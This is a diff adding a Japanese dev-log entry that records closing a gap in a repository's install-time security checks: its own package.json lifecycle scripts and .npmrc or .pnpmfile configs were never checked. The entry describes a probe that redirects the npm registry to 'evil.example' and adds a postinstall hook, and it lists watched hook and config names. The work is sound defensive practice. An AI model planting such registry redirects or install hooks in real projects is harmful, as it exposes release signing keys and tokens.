@@ -7,6 +7,79 @@
 >
 > 大幅な変更を加えた時は **このファイルも合わせて更新** してください。
 
+## パス 371 (2026-09-21) — `npm ci` の時点で走る「自分の」コードが無縛だった
+
+### 見つけた物
+
+`lint:deps` の規則 3 は「`npm ci` の時点で任意のコードが動くので危険度は高い」と
+**正しく述べている**。ところが見ていたのは lockfile の `hasInstallScript` ——
+つまり**依存の側**だけで、**このリポジトリ自身の `package.json` の
+lifecycle script** は誰も見ていなかった。
+
+### 実測 (2026-09-21)
+
+空の package.json に `postinstall` と `prepare` を置いて `npm ci` を回すと
+**どちらも走った** (印のファイルが残る)。つまり 1 行足せば、それは
+
+- CI の `npm ci`
+- **`release.yml` の梱包ジョブ (署名鍵 4 本と `GH_TOKEN` を env に持つ)**
+- 全員の手元
+
+で走る。対照 (同日実測): `"postinstall": "node -e …"` を足し、
+`.npmrc` に `registry=https://evil.example/` を書いて回すと ——
+
+```
+  npm run verify:all (37 ゲート)   exit 0
+  npm run chain:verify             exit 0
+```
+
+`.npmrc` は lockfile の `resolved` が効かない経路 —— **`npx -y` で走る
+MCP サーバ 25 件がまさにそれ** —— の取得元を丸ごと替える。
+`.pnpmfile.cjs` に至っては**インストール時に走る任意のコード**そのものである。
+
+パス 370 (`.claude/settings.json` の hooks) と同じ法則
+`config-that-picks-code-is-guarded` の **4 件目**。
+
+### 直し
+
+`lint:deps` に規則を 2 本足した (7 本 → **9 本**):
+
+- **規則 8** —— 自分の lifecycle script (`preinstall` / `install` / `postinstall` /
+  `prepare` / `prepublish` / `prepublishOnly` / `prepack` / `postpack`) が
+  理由つきの台帳と**双方向**。今日 **0 件**。
+- **規則 9** —— インストール時に読まれる設定 (`.npmrc` / `.yarnrc` / `.yarnrc.yml` /
+  `.pnpmfile.cjs` / `npm-shrinkwrap.json`) が台帳と**双方向**。今日 **0 件**。
+
+**`package.json` は鎖には入れない** —— 全履歴 **12 コミット**で「安定資産」の基準
+(パス 347) を満たさない。**門で形を見る**のが正しい道具である
+(パス 370 の `.claude/settings.json` は 1 コミットだったので鎖へ入れた)。
+
+実物がその規則の下に居ることは `installTimeCodeGuarded.test.ts` (6 件) が
+門の関数を借りて留める (`lint:deps` が CI から外れても `npm test` が鳴る)。
+
+### 対照 (2 方向とも鳴る)
+
+```
+  package.json に postinstall を足す   ❌ lint:deps
+  .npmrc を置く                        ❌ lint:deps
+```
+
+### ★ 自戒 —— 私が書いた self-test は、落ちたら例外になる形だった
+
+足した case を `selfTest()` の**先頭**に入れたが、カウンタ `let bad = 0` は
+**その 140 行下**に在った。全部通っている間は `bad++` に到達しないので緑になる ——
+**1 件でも落ちた瞬間に `ReferenceError` (TDZ) で死ぬ**、つまり
+「落ちたときに落ちない検査」だった。`eslint` の `no-useless-assignment` が
+症状だけを鳴らし、それで気付いた。宣言の**後ろ**へ移し、
+**わざと 1 件落として ✗ が印字されること**を確かめた。
+
+### 検証
+
+- `typecheck` / `npm test` (**17,925 件 ❌ 0**) / `verify:all` (37 ゲート) すべて green
+- `chain:verify` OK (block #250・保護対象 84)
+- 出荷物は **11,931,716 B / 3,344,237 B で byte 単位で不変**
+  (直したのは `scripts/` 1 本・`__tests__/` 1 本・オントロジー・文書だけ。両方を組んで実測した)
+
 ## パス 370 (2026-09-21) — セッション開始のたびに走るコマンドを、どのゲートも読んでいなかった
 
 ### 見つけた物
